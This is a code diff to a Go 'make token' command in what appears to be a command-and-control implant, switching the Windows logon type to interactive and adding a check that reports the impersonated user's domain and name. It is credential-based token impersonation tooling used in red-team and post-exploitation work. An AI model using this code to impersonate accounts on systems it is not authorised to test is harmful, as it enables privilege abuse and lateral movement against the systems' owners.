@@ -19,6 +19,7 @@ var (
 )
 
 const (
+	LOGON32_LOGON_INTERACTIVE     = 2
 	LOGON32_LOGON_NEW_CREDENTIALS = 9
 	LOGON32_PROVIDER_DEFAULT      = 0
 )
@@ -125,7 +126,7 @@ func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
 		uintptr(unsafe.Pointer(usernamePtr)),
 		uintptr(unsafe.Pointer(domainPtr)),
 		uintptr(unsafe.Pointer(passwordPtr)),
-		uintptr(LOGON32_LOGON_NEW_CREDENTIALS),
+		uintptr(LOGON32_LOGON_INTERACTIVE),
 		uintptr(LOGON32_PROVIDER_DEFAULT),
 		uintptr(unsafe.Pointer(&newTokenHandle)),
 	)
@@ -154,11 +155,24 @@ func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
 	// Don't close the handle - it needs to stay open for the impersonation to remain valid
 	// defer windows.CloseHandle(newTokenHandle) // REMOVED
 
-	output += "[+] Successfully applied token for network authentication\n"
-	output += "[!] Note: LOGON32_LOGON_NEW_CREDENTIALS only affects NETWORK operations\n"
-	output += "[*] Local operations (whoami, file access) still use your original token\n"
-	output += "[*] Network operations (SMB, WMI, etc.) will use the new credentials\n"
-	output += "[*] Test with: ls \\\\remotehost\\share or net use commands\n"
+	output += "[+] Successfully impersonated token!\n"
+
+	// Verify impersonation by checking thread token
+	var hThreadToken windows.Token
+	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, false, &hThreadToken)
+	if err == nil {
+		defer hThreadToken.Close()
+		threadTokenUser, err := hThreadToken.GetTokenUser()
+		if err == nil {
+			currentUsername, currentDomain, _, err := threadTokenUser.User.Sid.LookupAccount("")
+			if err == nil {
+				output += fmt.Sprintf("[+] Current context: %s\\%s\n", currentDomain, currentUsername)
+			}
+		}
+	} else {
+		output += "[!] Warning: Could not verify impersonation\n"
+	}
+
 	output += "[*] Use 'rev2self' to revert to original token"
 
 	return structs.CommandResult{
